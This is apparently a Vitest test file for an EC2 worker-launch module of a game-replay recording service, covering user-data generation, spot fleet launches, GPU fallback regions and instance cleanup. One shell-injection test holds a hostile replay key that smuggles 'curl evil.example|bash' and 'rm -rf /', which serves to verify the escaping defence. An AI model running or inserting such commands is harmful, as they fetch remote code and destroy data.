import { execFileSync } from "node:child_process";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
  CreateFleetCommand,
  CreateLaunchTemplateVersionCommand,
  DeleteLaunchTemplateVersionsCommand,
  DescribeInstancesCommand,
  DescribeSpotPriceHistoryCommand,
  DescribeSubnetsCommand,
  EC2Client,
  type FleetLaunchTemplateOverridesRequest,
  TerminateInstancesCommand,
} from "@aws-sdk/client-ec2";
import { mockClient } from "aws-sdk-client-mock";
import { recordingPlanFor } from "@sattori/shared";
import type { Ec2RecordingStep, GameId, JobRecord } from "@sattori/shared";
import {
  buildUserData,
  ecrRegionOf,
  fetchSpotPrice,
  findJobInstances,
  FleetLaunchError,
  getCandidateInstanceTypes,
  isTierCapacityExhausted,
  launchRecordingInstance,
  launchTierFor,
  listTaggedInstances,
  terminateInstance,
} from "./ec2.js";
import type { LaunchConstraints, LaunchTier } from "./ec2.js";
import type { ApiConfig } from "./config.js";

const ec2Mock = mockClient(EC2Client);

afterEach(() => {
  vi.unstubAllEnvs();
});

const config: ApiConfig = {
  uploadBucket: "up-bucket",
  outputBucket: "out-bucket",
  cdnDomain: "cdn.example.net",
  jobsTable: "sattori-jobs",
  workerImage: "123456789012.dkr.ecr.ap-northeast-1.amazonaws.com/sattori-worker:latest",
  workerGpuImage: "123456789012.dkr.ecr.ap-northeast-1.amazonaws.com/sattori-worker-gpu:latest",
  titleAssetsBucket: "title-assets-bucket",
  logGroup: "/sattori/worker",
  maxReplayBytes: 5 * 1024 * 1024,
  emailRateLimitTable: "email-rate-limit",
  settingsTable: "sattori-settings",
  workersTable: "sattori-workers",
  sesFromAddress: "no-reply@sattori.hakatashi.com",
  sesReplyToAddress: "reply@example.com",
  sesConfigurationSetName: "sattori-config-set",
  webBaseUrl: "https://sattori.hakatashi.com",
  analyticsEventsTable: "sattori-analytics-events",
  gpuSlotsTable: "sattori-gpu-slots",
  ec2: {
    subnetIds: ["subnet-aaaa", "subnet-bbbb"],
    region: "eu-south-2",
    launchTemplateId: "lt-xxxx",
    gpuLaunchTemplateId: "lt-gpu-xxxx",
    gpuFallback: null,
  },
};

/** GPUフォールバック先（Issue #296）を設定した構成。 */
const fallbackConfig: ApiConfig = {
  ...config,
  ec2: {
    ...config.ec2,
    gpuFallback: {
      region: "eu-north-1",
      launchTemplateName: "sattori-gpu-worker",
      subnetTagKey: "sattori:gpuWorkerSubnet",
      workerGpuImage: "123456789012.dkr.ecr.eu-north-1.amazonaws.com/sattori-worker-gpu:latest",
      outputBucket: "out-bucket-eun1",
      titleAssetsBucket: "title-assets-eun1",
    },
  },
};

const job: JobRecord = {
  jobId: "job-1",
  game: "th07",
  replayKey: "replays/abc.rpy",
  status: "queued",
  options: { watermark: true, th10BugfixMarisaB: false, th06ncHighResolution: false },
  outputPath: null,
  outputPath720p: null,
  error: null,
  errorCode: null,
  createdAt: "2026-07-17T00:00:00.000Z",
  updatedAt: "2026-07-17T00:00:00.000Z",
  doneAt: null,
  email: null,
  instanceId: null,
  workerKind: null,
  instanceType: null,
  availabilityZone: null,
  spotPricePerHour: null,
  launchedAt: null,
  outputBytes: null,
  outputBytes720p: null,
  estimatedDurationSeconds: 900,
  progress: null,
  uploadTotalBytes: null,
  previewImagePath: null,
  posterImagePath: null,
  replayInfo: null,
  pendingExpiresAt: null,
  retriedToJobId: null,
  retriedFromJobId: null,
  language: "ja",
  desyncDetected: null,
  timedOut: null,
};

describe("buildUserData", () => {
  it("ジョブのパラメータを環境変数として埋め込む", () => {
    const decoded = Buffer.from(buildUserData(config, job, "task-token-abc"), "base64").toString(
      "utf-8",
    );
    // 環境変数の値は単一引用符で括られる(Issue #127 SEC-1、shellEscape())。
    expect(decoded).toContain("JOB_ID='job-1'");
    expect(decoded).toContain("REPLAY_KEY='replays/abc.rpy'");
    expect(decoded).toContain("OUTPUT_BUCKET='out-bucket'");
    expect(decoded).toContain("TITLE_ASSETS_BUCKET='title-assets-bucket'");
    expect(decoded).toContain("WATERMARK='1'");
    expect(decoded).toContain(config.workerImage);
    // ECR ログイン先レジストリが正しく抽出されている
    expect(decoded).toContain("123456789012.dkr.ecr.ap-northeast-1.amazonaws.com");
    expect(decoded).toContain("shutdown -h now");
    // ECS エージェントを停止して x11grab とのCPUコンテンションを避ける
    expect(decoded).toContain("systemctl disable --now ecs");
    // CloudWatch Logs へジョブIDのストリームで送出する
    expect(decoded).toContain("--log-driver awslogs");
    expect(decoded).toContain("awslogs-group=/sattori/worker");
    expect(decoded).toContain("awslogs-stream=job-1");
    // taskToken と進捗算出用の推定再生時間を渡す
    expect(decoded).toContain("TASK_TOKEN='task-token-abc'");
    expect(decoded).toContain('-e TASK_TOKEN="$TASK_TOKEN"');
    expect(decoded).toContain("EXPECTED_DURATION_SECONDS='900'");
    // コンテナ起動前(ECR ログイン/pull)の失敗は bash から直接 SendTaskFailure する
    expect(decoded).toContain("send-task-failure");
    expect(decoded).toContain("docker pull");
  });

  it("ウォーターマーク無効時は WATERMARK=0", () => {
    const decoded = Buffer.from(
      buildUserData(
        config,
        { ...job, options: { watermark: false, th10BugfixMarisaB: false, th06ncHighResolution: false } },
        "task-token-abc",
      ),
      "base64",
    ).toString("utf-8");
    expect(decoded).toContain("WATERMARK='0'");
  });

  it("estimatedDurationSeconds が null なら EXPECTED_DURATION_SECONDS を付与しない", () => {
    const decoded = Buffer.from(
      buildUserData(config, { ...job, estimatedDurationSeconds: null }, "task-token-abc"),
      "base64",
    ).toString("utf-8");
    expect(decoded).not.toContain("EXPECTED_DURATION_SECONDS");
  });

  it("環境変数の値にシェルメタ文字が混ざっていてもコマンドインジェクションにならない（Issue #127 SEC-1）", () => {
    // 入口検証をすり抜けた／既存の汚染データを想定した多層防御の確認。
    const maliciousReplayKey = "replays/x.rpy$(curl evil.example|bash);'; rm -rf /; echo '";
    const decoded = Buffer.from(
      buildUserData(config, { ...job, replayKey: maliciousReplayKey }, "task-token-abc"),
      "base64",
    ).toString("utf-8");
    // シングルクォートを閉じてエスケープ済みのクォートを挟み再度開く形になっている
    expect(decoded).toContain(
      `REPLAY_KEY='replays/x.rpy$(curl evil.example|bash);'\\''; rm -rf /; echo '\\'''`,
    );
    // `bash -n` で実際に構文解析させ、注入された `$(...)`・`;` が独立したコマンドとして
    // 解釈されない(=1つの文字列リテラルの中に留まる)ことを確認する。実行はしない。
    expect(() => execFileSync("bash", ["-n"], { input: decoded })).not.toThrow();
  });

  it("taskTokenにシングルクォートが混ざっていても壊れない", () => {
    const decoded = Buffer.from(buildUserData(config, job, "abc'; echo pwned; '"), "base64").toString(
      "utf-8",
    );
    expect(decoded).toContain(`TASK_TOKEN='abc'\\''; echo pwned; '\\'''`);
    expect(() => execFileSync("bash", ["-n"], { input: decoded })).not.toThrow();
  });

  it("GPUの段はGPU系ECRイメージ・--gpus allを使う（Issue #241）", () => {
    const decoded = Buffer.from(
      buildUserData(config, { ...job, game: "th06nc" }, "task-token-abc", { gpu: true }),
      "base64",
    ).toString("utf-8");
    expect(decoded).toContain(config.workerGpuImage);
    expect(decoded).not.toContain(config.workerImage);
    expect(decoded).toContain("docker run --rm --gpus all --ipc=host -e NVIDIA_DRIVER_CAPABILITIES=all -e NVIDIA_VISIBLE_DEVICES=all -e VK_LOADER_DEBUG=all $GPU_NVIDIA_MOUNTS -v /tmp/.X11-unix:/tmp/.X11-unix -v /etc/vulkan/icd.d:/etc/vulkan/icd.d:ro");
    expect(decoded).toContain("for d in /dev/nvidia*; do");
    expect(decoded).toContain("--device $d");
    // ディレクトリ丸ごとマウントするとコンテナ自身のxserver-xorg-core由来モジュール
    // （wfb等）が隠れてXorgが起動できなくなる（Issue #82実機検証で判明）ため、
    // 個別ファイルだけをシェル側で動的に列挙してマウントする。
    expect(decoded).not.toContain("-v /usr/lib/xorg/modules:/usr/lib/xorg/modules:ro");
    expect(decoded).toContain("/usr/lib/xorg/modules/drivers/nvidia_drv.so");
    expect(decoded).toContain("/usr/lib/xorg/modules/extensions/libglxserver_nvidia.so*");
    // 32bitタイトル(th15)のwineプロセスがGPUクライアントライブラリを見つけられず
    // llvmpipeへ静かにフォールバックする不具合(Issue #82実機検証で判明)への対応。
    // nvidia-container-toolkitは64bitライブラリしか自動マウントしないため、
    // 32bit版は個別にファイル単位でマウントする。
    expect(decoded).not.toContain("-v /usr/lib/i386-linux-gnu:/usr/lib/i386-linux-gnu:ro");
    expect(decoded).toContain("/usr/lib/i386-linux-gnu/libGLX_nvidia.so*");
    expect(decoded).toContain("/usr/lib/i386-linux-gnu/libnvidia-*.so*");
    expect(decoded).toContain("-e GPU_WORKER='1'");
    // GPU用カスタムAMIはECS基盤ではないため、ECSエージェント停止処理は行わない。
    expect(decoded).not.toContain("systemctl disable --now ecs");
  });

  it("CPUの段は--gpus allを付けず、ECSエージェント停止処理も行う（th06ncでも同じ）", () => {
    for (const game of ["th07", "th06nc"] as const) {
      const decoded = Buffer.from(
        buildUserData(config, { ...job, game }, "task-token-abc", { gpu: false }),
        "base64",
      ).toString("utf-8");
      expect(decoded).toContain(config.workerImage);
      expect(decoded).not.toContain("--gpus all");
      expect(decoded).not.toContain("GPU_WORKER");
      expect(decoded).toContain("systemctl disable --now ecs");
    }
  });
});

/** タイトルの段を`id`で引く。 */
function stepOf(game: GameId, id: string): Ec2RecordingStep {
  const step = recordingPlanFor(game).find((s) => s.id === id);
  if (step?.kind !== "ec2") {
    throw new Error(`${game} に段 ${id} が無い`);
  }
  return step;
}

/** 段を解決した`LaunchTier`（解決できない段はテストの書き間違いなので失敗させる）。 */
function tierOf(
  game: GameId,
  id: string,
  cfg: ApiConfig = config,
  constraints: LaunchConstraints = {},
): LaunchTier {
  const tier = launchTierFor(cfg, stepOf(game, id), constraints);
  if (tier === null) {
    throw new Error(`${game} の段 ${id} を解決できない`);
  }
  return tier;
}

describe("getCandidateInstanceTypes", () => {
  it("段の候補をそのまま返す", () => {
    expect(getCandidateInstanceTypes(stepOf("th15", "gpu:eu-south-2"))).toEqual(["g6f.2xlarge"]);
    expect(getCandidateInstanceTypes(stepOf("th11", "cpu:eu-south-2"))).toEqual([
      "c7i.2xlarge",
      "c7a.2xlarge",
      "m7i.2xlarge",
    ]);
  });

  it("maxVcpu=8ならGPUの段はg6f.2xlargeを返す", () => {
    expect(getCandidateInstanceTypes(stepOf("th15", "gpu:eu-south-2"), { maxVcpu: 8 })).toEqual([
      "g6f.2xlarge",
    ]);
  });

  it("CPUの段はmaxVcpuを渡されても一切変わらない(GPUリース制約が漏れない)", () => {
    const step = stepOf("th11", "cpu:eu-south-2");
    expect(getCandidateInstanceTypes(step, { maxVcpu: 4 })).toEqual(getCandidateInstanceTypes(step));
  });

  it("候補が空になる制約(理屈上到達不能)は例外を投げる", () => {
    expect(() => getCandidateInstanceTypes(stepOf("th15", "gpu:eu-south-2"), { maxVcpu: 4 })).toThrow(
      /GPUリース/,
    );
  });
});

describe("launchTierFor", () => {
  it("一次リージョンのCPUの段はCPU系Launch Template・一次リージョンのサブネット", async () => {
    const tier = tierOf("th07", "cpu:eu-south-2");
    expect(tier).toMatchObject({
      id: "cpu:eu-south-2",
      region: "eu-south-2",
      gpu: false,
      launchTemplate: { LaunchTemplateId: "lt-xxxx" },
      workerImage: undefined,
    });
    expect(await tier.resolveSubnetIds()).toEqual(["subnet-aaaa", "subnet-bbbb"]);
  });

  it("一次リージョンのGPUの段はGPU系Launch Template", () => {
    expect(tierOf("th08", "gpu:eu-south-2")).toMatchObject({
      gpu: true,
      launchTemplate: { LaunchTemplateId: "lt-gpu-xxxx" },
      candidateInstanceTypes: ["g6f.2xlarge"],
    });
  });

  it("フォールバック先のGPUの段は固定名Launch Template・レプリカのイメージ", () => {
    expect(tierOf("th08", "gpu:eu-north-1", fallbackConfig)).toMatchObject({
      region: "eu-north-1",
      gpu: true,
      launchTemplate: { LaunchTemplateName: "sattori-gpu-worker" },
      workerImage: "123456789012.dkr.ecr.eu-north-1.amazonaws.com/sattori-worker-gpu:latest",
    });
  });

  it("フォールバック先が未設定なら、その段は解決できない", () => {
    expect(launchTierFor(config, stepOf("th08", "gpu:eu-north-1"))).toBeNull();
  });

  it("フォールバック先のリージョンでもCPUの段は解決しない（Launch Templateが無い）", () => {
    const step: Ec2RecordingStep = { ...stepOf("th08", "cpu:eu-south-2"), region: "eu-north-1" };
    expect(launchTierFor(fallbackConfig, step)).toBeNull();
  });

  it("全タイトルの段が本番相当の構成で解決できる", () => {
    for (const game of ["th06", "th07", "th11", "th15", "th20", "th06nc"] as const) {
      for (const step of recordingPlanFor(game)) {
        if (step.kind === "ec2") {
          expect(launchTierFor(fallbackConfig, step), `${game} ${step.id}`).not.toBeNull();
        }
      }
    }
  });
});

describe("launchRecordingInstance", () => {
  beforeEach(() => {
    ec2Mock.reset();
  });

  it("Launch Template の新バージョンを作成し、EC2 Fleet で起動して実際に確保されたインスタンス情報を返す", async () => {
    ec2Mock.on(CreateLaunchTemplateVersionCommand).resolves({
      LaunchTemplateVersion: { VersionNumber: 3 },
    });
    ec2Mock.on(CreateFleetCommand).resolves({
      Instances: [
        {
          InstanceIds: ["i-0123456789abcdef0"],
          InstanceType: "c7i.xlarge",
          AvailabilityZone: "eu-south-2a",
        },
      ],
    });

    ec2Mock.on(DescribeSpotPriceHistoryCommand).resolves({
      SpotPriceHistory: [{ SpotPrice: "0.0612" }],
    });

    const instance = await launchRecordingInstance(config, job, "task-token-abc", tierOf("th07", "cpu:eu-south-2"));

    expect(instance).toEqual({
      instanceId: "i-0123456789abcdef0",
      region: "eu-south-2",
      instanceType: "c7i.xlarge",
      availabilityZone: "eu-south-2a",
      spotPricePerHour: 0.0612,
    });

    const versionCall = ec2Mock.commandCalls(CreateLaunchTemplateVersionCommand)[0];
    expect(versionCall?.args[0].input).toMatchObject({
      LaunchTemplateId: "lt-xxxx",
      SourceVersion: "$Latest",
    });

    const fleetCall = ec2Mock.commandCalls(CreateFleetCommand)[0];
    expect(fleetCall?.args[0].input).toMatchObject({
      Type: "instant",
      TargetCapacitySpecification: {
        TotalTargetCapacity: 1,
        DefaultTargetCapacityType: "spot",
      },
      SpotOptions: {
        AllocationStrategy: "price-capacity-optimized",
        SingleInstanceType: false,
      },
    });
    // サブネット(AZ) × 候補インスタンスタイプの全組み合わせをOverridesに渡す
    // （単一AZ・単一インスタンスタイプでのSpot枯渇耐性、Issue #29）
    const overrides = fleetCall?.args[0].input.LaunchTemplateConfigs?.[0]?.Overrides ?? [];
    expect(overrides).toHaveLength(8);
    expect(overrides).toEqual(
      expect.arrayContaining([
        { SubnetId: "subnet-aaaa", InstanceType: "c7i.xlarge" },
        { SubnetId: "subnet-bbbb", InstanceType: "c7i.xlarge" },
        { SubnetId: "subnet-aaaa", InstanceType: "c7a.xlarge" },
        { SubnetId: "subnet-bbbb", InstanceType: "c7i-flex.xlarge" },
        { SubnetId: "subnet-aaaa", InstanceType: "m7i.xlarge" },
      ]),
    );
    expect(fleetCall?.args[0].input.LaunchTemplateConfigs?.[0]).toMatchObject({
      LaunchTemplateSpecification: { LaunchTemplateId: "lt-xxxx", Version: "3" },
    });
  });

  it("InstanceType/AvailabilityZoneがレスポンスに含まれない場合はnullにフォールバックする", async () => {
    ec2Mock.on(CreateLaunchTemplateVersionCommand).resolves({
      LaunchTemplateVersion: { VersionNumber: 3 },
    });
    ec2Mock.on(CreateFleetCommand).resolves({
      Instances: [{ InstanceIds: ["i-0123456789abcdef0"] }],
    });

    const instance = await launchRecordingInstance(
      config,
      { ...job, game: "th11" },
      "task-token-abc",
      tierOf("th11", "cpu:eu-south-2"),
    );
    expect(instance.instanceType).toBeNull();
    expect(instance.availabilityZone).toBeNull();
  });

  it("GPUの段はGPU専用Launch Template・g6f.2xlarge・worker-gpuイメージで起動する（Issue #241・#288）", async () => {
    ec2Mock.on(CreateLaunchTemplateVersionCommand).resolves({
      LaunchTemplateVersion: { VersionNumber: 5 },
    });
    ec2Mock.on(CreateFleetCommand).resolves({
      Instances: [{ InstanceIds: ["i-0123456789abcdef0"], InstanceType: "g6f.2xlarge" }],
    });

    await launchRecordingInstance(
      config,
      { ...job, game: "th07", options: { ...job.options, recordingSpeed: 3 } },
      "task-token-abc",
      tierOf("th07", "gpu:eu-south-2", config, { maxVcpu: 8 }),
    );

    const versionCall = ec2Mock.commandCalls(CreateLaunchTemplateVersionCommand)[0];
    expect(versionCall?.args[0].input.LaunchTemplateId).toBe("lt-gpu-xxxx");
    const fleetCall = ec2Mock.commandCalls(CreateFleetCommand)[0];
    expect(fleetCall?.args[0].input.LaunchTemplateConfigs?.[0]).toMatchObject({
      LaunchTemplateSpecification: { LaunchTemplateId: "lt-gpu-xxxx", Version: "5" },
    });
    // GPUの段もCPUと同じ全AZ(subnet-aaaa・subnet-bbbb)を候補にする
    // (`eu-south-2a`除外[Issue #267/decisions#0055]はIssue #281で撤回済み)。
    expect(fleetCall?.args[0].input.LaunchTemplateConfigs?.[0]?.Overrides).toEqual([
      { SubnetId: "subnet-aaaa", InstanceType: "g6f.2xlarge" },
      { SubnetId: "subnet-bbbb", InstanceType: "g6f.2xlarge" },
    ]);
    const userData = Buffer.from(
      versionCall?.args[0].input.LaunchTemplateData?.UserData ?? "",
      "base64",
    ).toString("utf-8");
    expect(userData).toContain("--gpus all");
    expect(userData).toContain("-e FPS_LIMIT_TARGET_HZ='180'");
    expect(userData).toContain("-e GPU_WORKER='1'");
  });

  it("フォールバック先の段はそのリージョンのECRレプリカ・バケットを使い、データ面は一次リージョンのまま（Issue #296・#313）", async () => {
    ec2Mock.on(CreateLaunchTemplateVersionCommand).resolves({
      LaunchTemplateVersion: { VersionNumber: 7 },
    });
    ec2Mock.on(DescribeSubnetsCommand).resolves({
      Subnets: [{ SubnetId: "subnet-north-b" }, { SubnetId: "subnet-north-a" }],
    });
    ec2Mock.on(DescribeSpotPriceHistoryCommand).resolves({
      SpotPriceHistory: [{ SpotPrice: "0.0886" }],
    });
    ec2Mock.on(CreateFleetCommand).resolves({
      Instances: [
        { InstanceIds: ["i-north"], InstanceType: "g6f.2xlarge", AvailabilityZone: "eu-north-1b" },
      ],
    });

    const instance = await launchRecordingInstance(
      fallbackConfig,
      { ...job, game: "th06nc" },
      "task-token-abc",
      tierOf("th06nc", "gpu:eu-north-1", fallbackConfig),
    );

    expect(instance).toEqual({
      instanceId: "i-north",
      region: "eu-north-1",
      instanceType: "g6f.2xlarge",
      availabilityZone: "eu-north-1b",
      spotPricePerHour: 0.0886,
    });
    const versionInput = ec2Mock.commandCalls(CreateLaunchTemplateVersionCommand)[0]?.args[0].input;
    expect(versionInput).toMatchObject({ LaunchTemplateName: "sattori-gpu-worker", SourceVersion: "$Latest" });
    expect(versionInput?.LaunchTemplateId).toBeUndefined();
    const userData = Buffer.from(versionInput?.LaunchTemplateData?.UserData ?? "", "base64").toString("utf-8");
    expect(userData).toContain("aws ecr get-login-password --region eu-north-1");
    expect(userData).toContain(
      "docker pull 123456789012.dkr.ecr.eu-north-1.amazonaws.com/sattori-worker-gpu:latest",
    );
    expect(userData).toContain("export AWS_DEFAULT_REGION=eu-south-2");
    expect(userData).toContain("awslogs-region=eu-south-2");
    expect(userData).toContain("-e AWS_REGION='eu-south-2'");
    expect(userData).toContain("-e OUTPUT_BUCKET='out-bucket-eun1'");
    expect(userData).toContain("-e OUTPUT_BUCKET_REGION='eu-north-1'");
    expect(userData).toContain("-e TITLE_ASSETS_BUCKET='title-assets-eun1'");
    expect(userData).toContain("-e TITLE_ASSETS_BUCKET_REGION='eu-north-1'");

    const fleetInput = ec2Mock.commandCalls(CreateFleetCommand)[0]?.args[0].input;
    expect(fleetInput?.LaunchTemplateConfigs?.[0]?.LaunchTemplateSpecification).toEqual({
      LaunchTemplateName: "sattori-gpu-worker",
      Version: "7",
    });
    // フォールバック先のサブネットはタグで引いたもの（ソート済み）。
    expect(fleetInput?.LaunchTemplateConfigs?.[0]?.Overrides).toEqual([
      { SubnetId: "subnet-north-a", InstanceType: "g6f.2xlarge" },
      { SubnetId: "subnet-north-b", InstanceType: "g6f.2xlarge" },
    ]);
    expect(ec2Mock.commandCalls(DescribeSubnetsCommand)[0]?.args[0].input.Filters).toEqual([
      { Name: "tag:sattori:gpuWorkerSubnet", Values: ["true"] },
    ]);
  });

  it("インスタンスが起動できなかった場合は Errors を含めて例外を投げる", async () => {
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
    ec2Mock.on(CreateLaunchTemplateVersionCommand).resolves({
      LaunchTemplateVersion: { VersionNumber: 1 },
    });
    ec2Mock.on(CreateFleetCommand).resolves({
      Instances: [],
      Errors: [{ ErrorCode: "InsufficientCapacity", ErrorMessage: "no capacity" }],
    });

    await expect(
      launchRecordingInstance(config, job, "task-token-abc", tierOf("th07", "cpu:eu-south-2")),
    ).rejects.toThrow(/InsufficientCapacity/);
    errorSpy.mockRestore();
  });

  it("段の全サブネット×全候補がSpot在庫の枯渇ならcapacityExhaustedを立てる（Issue #315）", async () => {
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
    ec2Mock.on(CreateLaunchTemplateVersionCommand).resolves({
      LaunchTemplateVersion: { VersionNumber: 1 },
    });
    ec2Mock.on(CreateFleetCommand).callsFake(async (input) => {
      const overrides: FleetLaunchTemplateOverridesRequest[] =
        input.LaunchTemplateConfigs?.[0]?.Overrides ?? [];
      return {
        Instances: [],
        Errors: overrides.map((override) => ({
          ErrorCode: "UnfulfillableCapacity",
          ErrorMessage: "nope",
          LaunchTemplateAndOverrides: { Overrides: override },
        })),
      };
    });

    const err = await launchRecordingInstance(
      config,
      { ...job, game: "th08" },
      "task-token-abc",
      tierOf("th08", "gpu:eu-south-2"),
    ).catch((e: unknown) => e);

    expect(err).toBeInstanceOf(FleetLaunchError);
    expect((err as FleetLaunchError).capacityExhausted).toBe(true);
    expect((err as FleetLaunchError).errorCodes).toContain("UnfulfillableCapacity");
    errorSpy.mockRestore();
  });

  it("起動失敗時にErrorCodeを含む構造化ログを残す(Issue #270、クオータ超過とSpot在庫枯渇の切り分け用)", async () => {
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
    ec2Mock.on(CreateLaunchTemplateVersionCommand).resolves({
      LaunchTemplateVersion: { VersionNumber: 1 },
    });
    ec2Mock.on(CreateFleetCommand).resolves({
      Instances: [],
      Errors: [{ ErrorCode: "VcpuLimitExceeded", ErrorMessage: "quota exceeded" }],
    });

    const err = await launchRecordingInstance(
      config,
      job,
      "task-token-abc",
      tierOf("th07", "cpu:eu-south-2"),
    ).catch((e: unknown) => e);
    expect((err as FleetLaunchError).capacityExhausted).toBe(false);

    const logged = errorSpy.mock.calls
      .map((call) => call[0] as string)
      .map((line) => JSON.parse(line))
      .find((entry) => entry.event === "create_fleet_failed");
    expect(logged).toMatchObject({
      event: "create_fleet_failed",
      jobId: job.jobId,
      errorCodes: ["VcpuLimitExceeded"],
    });
    errorSpy.mockRestore();
  });

  it("起動に成功しても失敗しても、作ったLaunch Templateバージョンを消す（Issue #315）", async () => {
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
    ec2Mock.on(CreateLaunchTemplateVersionCommand).resolves({
      LaunchTemplateVersion: { VersionNumber: 7 },
    });
    ec2Mock.on(DeleteLaunchTemplateVersionsCommand).resolves({});
    ec2Mock
      .on(CreateFleetCommand)
      .resolvesOnce({ Instances: [], Errors: [{ ErrorCode: "UnfulfillableCapacity", ErrorMessage: "nope" }] })
      .resolves({ Instances: [{ InstanceIds: ["i-ok"] }] });

    await launchRecordingInstance(config, job, "t", tierOf("th07", "cpu:eu-south-2")).catch(() => {});
    await launchRecordingInstance(config, job, "t", tierOf("th07", "gpu:eu-south-2"));

    expect(
      ec2Mock.commandCalls(DeleteLaunchTemplateVersionsCommand).map((call) => call.args[0].input),
    ).toEqual([
      { LaunchTemplateId: "lt-xxxx", Versions: ["7"] },
      { LaunchTemplateId: "lt-gpu-xxxx", Versions: ["7"] },
    ]);
    errorSpy.mockRestore();
  });

  it("Launch Templateバージョンの削除に失敗しても起動は成功させる", async () => {
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
    ec2Mock.on(CreateLaunchTemplateVersionCommand).resolves({
      LaunchTemplateVersion: { VersionNumber: 7 },
    });
    ec2Mock.on(CreateFleetCommand).resolves({ Instances: [{ InstanceIds: ["i-ok"] }] });
    ec2Mock.on(DeleteLaunchTemplateVersionsCommand).rejects(new Error("throttled"));

    const instance = await launchRecordingInstance(config, job, "t", tierOf("th07", "cpu:eu-south-2"));

    expect(instance.instanceId).toBe("i-ok");
    expect(warnSpy).toHaveBeenCalledWith(expect.stringContaining("launch_template_version_delete_failed"));
    warnSpy.mockRestore();
  });
});

describe("isTierCapacityExhausted（Issue #315）", () => {
  const capacityError = (SubnetId: string, InstanceType: string, ErrorCode = "UnfulfillableCapacity") => ({
    ErrorCode,
    LaunchTemplateAndOverrides: {
      Overrides: { SubnetId, InstanceType: InstanceType as "g6f.2xlarge" },
    },
  });
  const types = ["g6f.2xlarge"] as "g6f.2xlarge"[];

  it("全サブネットが容量不足なら使い切りと判定する", () => {
    expect(
      isTierCapacityExhausted(
        [capacityError("a", "g6f.2xlarge"), capacityError("b", "g6f.2xlarge")],
        ["a", "b"],
        types,
      ),
    ).toBe(true);
  });

  it("報告の無いサブネットがあれば使い切りと判定しない", () => {
    expect(isTierCapacityExhausted([capacityError("a", "g6f.2xlarge")], ["a", "b"], types)).toBe(false);
  });

  it("報告の無い候補タイプがあれば使い切りと判定しない", () => {
    const candidates = ["c7i.xlarge", "c7a.xlarge"] as "c7i.xlarge"[];
    expect(isTierCapacityExhausted([capacityError("a", "c7i.xlarge")], ["a"], candidates)).toBe(false);
  });

  it("クォータ超過が1件でも混ざれば使い切りと判定しない", () => {
    expect(
      isTierCapacityExhausted(
        [capacityError("a", "g6f.2xlarge"), capacityError("b", "g6f.2xlarge", "MaxSpotInstanceCountExceeded")],
        ["a", "b"],
        types,
      ),
    ).toBe(false);
  });

  it("組み合わせの書かれていないエラーだけなら使い切りと判定しない", () => {
    expect(isTierCapacityExhausted([{ ErrorCode: "UnfulfillableCapacity" }], ["a"], types)).toBe(false);
  });

  it("エラーが無ければ使い切りと判定しない", () => {
    expect(isTierCapacityExhausted([], ["a"], types)).toBe(false);
  });
});

describe("ecrRegionOf", () => {
  it("ECRのレジストリホスト名からリージョンを取り出す", () => {
    expect(ecrRegionOf("123456789012.dkr.ecr.eu-north-1.amazonaws.com")).toBe("eu-north-1");
    expect(ecrRegionOf("docker.io")).toBeNull();
  });
});

describe("terminateInstance", () => {
  beforeEach(() => {
    ec2Mock.reset();
  });

  it("TerminateInstances を呼ぶ", async () => {
    ec2Mock.on(TerminateInstancesCommand).resolves({});
    await terminateInstance("i-0123456789abcdef0");
    expect(ec2Mock.commandCalls(TerminateInstancesCommand)[0]?.args[0].input).toEqual({
      InstanceIds: ["i-0123456789abcdef0"],
    });
  });

  it("既に存在しないインスタンスは冪等に成功扱いにする", async () => {
    const err = Object.assign(new Error("not found"), { name: "InvalidInstanceID.NotFound" });
    ec2Mock.on(TerminateInstancesCommand).rejects(err);
    await expect(terminateInstance("i-0123456789abcdef0")).resolves.toBeUndefined();
  });

  it("それ以外のエラーは再送出する", async () => {
    const err = Object.assign(new Error("boom"), { name: "SomeOtherError" });
    ec2Mock.on(TerminateInstancesCommand).rejects(err);
    await expect(terminateInstance("i-0123456789abcdef0")).rejects.toThrow("boom");
  });

  it("リージョンを指定すればそのリージョンのクライアントで呼ぶ（Issue #296）", async () => {
    const regions: string[] = [];
    ec2Mock.on(TerminateInstancesCommand).callsFake(async (_input, getClient) => {
      regions.push(await getClient().config.region());
      return {};
    });
    await terminateInstance("i-0123456789abcdef0", "eu-north-1");
    expect(regions).toEqual(["eu-north-1"]);
  });
});

describe("findJobInstances", () => {
  beforeEach(() => {
    ec2Mock.reset();
  });

  it("タグ(sattori:jobId)と未終了の状態でフィルタして全インスタンスIDを返す", async () => {
    // Step Functionsのリトライで複数台が孤児化していることもあるため、
    // Reservationを跨いで平坦化して返す。
    ec2Mock.on(DescribeInstancesCommand).resolves({
      Reservations: [
        { Instances: [{ InstanceId: "i-aaa" }, { InstanceId: undefined }] },
        { Instances: [{ InstanceId: "i-bbb" }] },
        {},
      ],
    });

    await expect(findJobInstances("job-1")).resolves.toEqual([
      { instanceId: "i-aaa", region: "eu-south-2" },
      { instanceId: "i-bbb", region: "eu-south-2" },
    ]);
    expect(ec2Mock.commandCalls(DescribeInstancesCommand)[0]?.args[0].input.Filters).toEqual([
      { Name: "tag:sattori:jobId", Values: ["job-1"] },
      { Name: "instance-state-name", Values: ["pending", "running", "stopping", "stopped"] },
    ]);
  });

  it("該当インスタンスが無ければ空配列", async () => {
    ec2Mock.on(DescribeInstancesCommand).resolves({});
    await expect(findJobInstances("job-1")).resolves.toEqual([]);
  });

  it("GPUフォールバック先が設定されていれば両リージョンを探す（Issue #296）", async () => {
    vi.stubEnv("GPU_FALLBACK_REGION", "eu-north-1");
    ec2Mock.on(DescribeInstancesCommand).callsFake(async (_input, getClient) => {
      const region = await getClient().config.region();
      return { Reservations: [{ Instances: [{ InstanceId: `i-${region}` }] }] };
    });

    await expect(findJobInstances("job-1")).resolves.toEqual([
      { instanceId: "i-eu-south-2", region: "eu-south-2" },
      { instanceId: "i-eu-north-1", region: "eu-north-1" },
    ]);
  });
});

describe("listTaggedInstances", () => {
  beforeEach(() => {
    ec2Mock.reset();
  });

  it("ジョブIDタグを持つ生存インスタンスを、タグの値と起動時刻つきで返す", async () => {
    const launchTime = new Date("2026-08-14T00:00:00.000Z");
    ec2Mock.on(DescribeInstancesCommand).resolves({
      Reservations: [
        {
          Instances: [
            {
              InstanceId: "i-aaa",
